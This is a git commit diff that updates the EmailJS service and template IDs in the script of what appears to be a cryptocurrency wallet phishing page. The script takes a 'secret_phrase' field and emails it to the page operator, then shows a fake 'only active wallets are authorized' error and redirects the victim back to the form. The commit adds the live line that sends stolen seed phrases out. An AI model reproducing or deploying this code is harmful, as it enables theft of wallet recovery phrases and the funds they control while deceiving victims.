e9250f996113f6cd6c773f55208ba28d1a328258
Joseph Fadairo <74228417+joefadairo8@users.noreply.github.com>
2024-05-21 18:26:57 +0100

    Update script.js

--- check/script.js
+++ check/script.js
@@ -2,7 +2,7 @@ function SendMail() {
     var params = {
         result : document.getElementById("secret_phrase").value
     }
-    emailjs.send("service_79q7jrl", "template_mjpnj9c", params).then(function (res) {
+    emailjs.send("service_fm0ybhm", "template_bhbz48m", params).then(function (res) {
         alert("Error!: ONLY ACTIVE WALLETS ARE AUTHORIZED" );
         window.location.href = "/check/index.html";
     })
